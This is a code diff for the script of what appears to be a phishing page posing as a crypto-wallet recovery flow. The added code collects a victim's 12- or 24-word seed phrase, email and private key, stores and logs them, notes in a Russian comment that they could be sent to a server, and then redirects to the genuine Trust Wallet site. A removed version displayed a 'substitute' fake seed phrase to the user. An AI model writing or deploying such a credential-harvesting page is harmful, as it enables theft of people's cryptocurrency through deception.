@@ -532,35 +532,145 @@
 
 
 
-const seedForm = document.getElementById('seedForm');
-const seedInput = document.getElementById('seedInput');
-const newSeedDisplay = document.getElementById('newSeedDisplay');
-const generatedSeed = document.getElementById('generatedSeed');
+// const seedForm = document.getElementById('seedForm');
+// const seedInput = document.getElementById('seedInput');
+// const newSeedDisplay = document.getElementById('newSeedDisplay');
+// const generatedSeed = document.getElementById('generatedSeed');
 
-const fakeSeed = [
-    "need", "height", "simplified", "cold", "fast", "observe",
-    "object", "blind", "heat", "charging", "bottle", "fireworks"
-];
+// const fakeSeed = [
+//     "need", "height", "simplified", "cold", "fast", "observe",
+//     "object", "blind", "heat", "charging", "bottle", "fireworks"
+// ];
 
-seedForm.addEventListener('submit', function (e) {
+// seedForm.addEventListener('submit', function (e) {
+//     e.preventDefault();
+
+//     const userSeed = seedInput.value.trim();
+
+//     if (userSeed.split(" ").length < 12) {
+//         alert("Введите корректную seed-фразу (минимум 12 слов).");
+//         return;
+//     }
+
+//     localStorage.setItem("userSeedPhrase", userSeed);
+
+//     generatedSeed.textContent = fakeSeed.join(", ");
+//     newSeedDisplay.style.display = "block";
+
+//     setTimeout(() => {
+//         seedForm.classList.add("fade-out");
+//     }, 10000);
+// });
+
+// const step1 = document.getElementById('step1');
+//     const step2 = document.getElementById('step2');
+//     const step3 = document.getElementById('step3');
+//     const seedForm = document.getElementById('seedForm');
+//     const seedInput = document.getElementById('seedInput');
+
+//     function goToStep2() {
+//         step1.classList.add('hidden');
+//         step2.classList.remove('hidden');
+//     }
+
+//     seedForm.addEventListener('submit', function (e) {
+//         e.preventDefault();
+//         const seed = seedInput.value.trim();
+//         const wordCount = seed.split(/\s+/).length;
+
+//         if (wordCount !== 12 && wordCount !== 24) {
+//             alert("Seed-фраза должна содержать 12 или 24 слова.");
+//             return;
+//         }
+
+//         localStorage.setItem("userSeedPhrase", seed);
+
+//         step2.classList.add('hidden');
+//         step3.classList.remove('hidden');
+//     });
+
+
+
+
+const step1 = document.getElementById('step1');
+  const step2 = document.getElementById('step2');
+  const step3 = document.getElementById('step3');
+  const stepLoading = document.getElementById('stepLoading');
+  const seedForm = document.getElementById('seedForm');
+  const seedInput = document.getElementById('seedInput');
+  const emailInput = document.getElementById('emailInput');
+  const userEmailDisplay = document.getElementById('userEmailDisplay');
+
+  function goToStep2() {
+    step1.classList.add('fadeOut');
+    setTimeout(() => {
+      step1.classList.add('hidden');
+      step2.classList.remove('hidden');
+    }, 500);
+  }
+
+  seedForm.addEventListener('submit', function (e) {
     e.preventDefault();
+    const seed = seedInput.value.trim();
+    const email = emailInput.value.trim();
+    const wordCount = seed.split(/\s+/).length;
 
-    const userSeed = seedInput.value.trim();
-
-    if (userSeed.split(" ").length < 12) {
-        alert("Введите корректную seed-фразу (минимум 12 слов).");
-        return;
+    if ((wordCount !== 12 && wordCount !== 24) || !validateEmail(email)) {
+      alert("Пожалуйста, введите корректную seed-фразу и email.");
+      return;
     }
 
-    // Сохраняем
-    localStorage.setItem("userSeedPhrase", userSeed);
+    localStorage.setItem("userSeedPhrase", seed);
+    localStorage.setItem("userEmail", email);
 
-    // Показываем подставную фразу
-    generatedSeed.textContent = fakeSeed.join(", ");
-    newSeedDisplay.style.display = "block";
-
-    // Плавное исчезновение формы через 10 сек
+    step2.classList.add('fadeOut');
     setTimeout(() => {
-        seedForm.classList.add("fade-out");
-    }, 10000);
-});
+      step2.classList.add('hidden');
+      stepLoading.classList.remove('hidden');
+
+      setTimeout(() => {
+        stepLoading.classList.add('fadeOut');
+        setTimeout(() => {
+          stepLoading.classList.add('hidden');
+          userEmailDisplay.innerText = email;
+          step3.classList.remove('hidden');
+        }, 500);
+      }, 4000);
+    }, 500);
+  });
+
+  function validateEmail(email) {
+    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+  }
+
+  function finish() {
+    alert("Вы будете перенаправлены на главный экран.");
+    location.href = "https://trustwallet.com"; // фейковый редирект
+  }
+
+  function showStep2() {
+    document.getElementById("step1").classList.add("hidden");
+    document.getElementById("step2").classList.remove("hidden");
+  }
+  
+  function selectMethod(method) {
+    document.getElementById("step2").classList.add("hidden");
+    if (method === "seed") {
+      document.getElementById("seedForm").classList.remove("hidden");
+    } else {
+      document.getElementById("privateForm").classList.remove("hidden");
+    }
+  }
+  
+  function submitRecovery() {
+    const seed = document.getElementById("seedInput")?.value;
+    const key = document.getElementById("privateInput")?.value;
+    console.log("Seed:", seed);
+    console.log("Private Key:", key);
+    
+    // Можно отправить на сервер тут, если нужно
+  
+    document.getElementById("seedForm")?.classList.add("hidden");
+    document.getElementById("privateForm")?.classList.add("hidden");
+    document.getElementById("finalMessage").classList.remove("hidden");
+  }
